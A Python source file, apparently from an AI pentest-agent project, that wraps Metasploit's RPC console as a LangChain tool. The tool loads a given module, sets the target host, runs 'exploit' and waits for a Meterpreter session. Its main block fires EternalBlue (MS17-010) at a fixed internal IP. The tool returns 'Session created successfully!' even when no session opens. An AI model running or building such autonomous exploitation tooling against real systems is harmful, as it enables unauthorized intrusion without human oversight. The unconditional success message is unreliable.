import sys
import time
from typing import Type

sys.path.append("/home/kali/Agent")

from langchain_core.tools import BaseTool
from openai import BaseModel
from pydantic import Field
from config.msfConsole import Client


# 用于查询ms17-010相观模块的命令，如果存在相关的模块就，选择其中的一个模块
# 使用 auxiliary/scanner/smb/smb_ms17_010 模块，你可以扫描网络上的主机，检测它们是
# 否受到 MS17-010 漏洞的影响。这个模块的主要目的是帮助管理员识别潜在易受攻击的系统

class ScanningModuleInput(BaseModel):
    moduleName: str = Field(description="模块名称")
    RHOST: str = Field(description="目标主机的IP地址")
    # isDestroy_console: bool = Field(default=False, description="是否销毁控制台")
    # console_module_id: int = Field(default=None, description="控制台的ID")


# 3.1.加载扫描模块 "perform_vuln_scan"。Load scanning module
class msfconsole_Attack_module(BaseTool):
    name = "msfconsole_attack_module"
    description = "接受一个字符串作为搜索的模块，扫描网络上的主机，检测它们是否受到 MS17-010 漏洞的影响.从而使用模块来经进行攻击"
    args_schema: Type[BaseModel] = ScanningModuleInput

    def _run(self, moduleName: str, RHOST: str):
        """使用命令来查询相关模块"""
        auth = Client("127.0.0.1", port=55553, user="msf", passwd="msf")
        cmd = f"""
            use {moduleName}
            set payload
            show options
            set rhosts {RHOST}
            exploit
            """
        console_id = auth.create_console().get(b'id')
        res = auth.get_version()
        resp = auth.write_console(console_id, cmd)
        time.sleep(1)
        while True:
            res = auth.read_console(console_id)
            if res[b'busy'] == True:
                print(res[b'data'].decode())
                if b'Meterpreter session' in res[b'data']:
                    break
                time.sleep(1)
                continue
            elif res[b'busy'] == False:
                break
        return "Session created successfully!"  # 更新最后一个会话的输出


if __name__ == '__main__':
    attack = msfconsole_Attack_module()
    search__run = attack._run(moduleName="exploit/windows/smb/ms17_010_eternalblue",RHOST="192.168.92.137")
    print(search__run)





